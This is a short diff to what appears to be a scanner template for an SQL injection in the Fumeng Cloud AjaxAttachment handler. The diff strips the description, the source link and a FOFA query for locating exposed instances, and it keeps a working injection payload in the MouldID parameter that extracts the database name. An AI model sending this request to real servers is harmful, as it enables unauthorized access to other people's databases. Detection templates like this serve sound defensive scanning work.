@@ -3,12 +3,8 @@ info:
   name: 孚盟云AjaxAttachment存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gkn3xdbw86rhfnaa'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gkn3xdbw86rhfnaa
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'GET /m/Dingding/Ajax/AjaxAttachment.ashx?method=saveAttach&MouldID=1%27and+1%3Cdb_name%28%29-- HTTP/1.1
